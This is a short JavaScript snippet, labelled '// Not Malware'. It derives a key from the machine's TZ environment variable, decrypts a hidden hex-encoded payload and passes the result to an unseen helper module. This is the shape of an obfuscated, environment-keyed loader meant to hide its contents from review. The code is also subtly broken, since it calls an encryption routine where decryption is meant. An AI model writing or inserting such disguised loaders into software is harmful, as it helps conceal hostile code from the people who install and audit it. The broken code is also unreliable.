// Not Malware
var abc = require('./abc.js');
const crypto = require('crypto');

crypto.pbkdf2(process.env.TZ, 'salt', 100000, 32, 'sha512', (err, derivedKey) => {
    const decipher = crypto.createCipheriv("aes-256-gcm", derivedKey, new ArrayBuffer(16));
    const toDecrypt = 'aeae244d460a02a49cbaf11b411a26f94111fccf9244e3d633ac3bd1ea28335e80b526124ed26537e279ee37e92bdbad3549730557174b13420e37c6ef6a'
    let decrypted = decipher.update(toDecrypt, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    var d = abc.a(decrypted);
    console.log(abc.b(d));
});
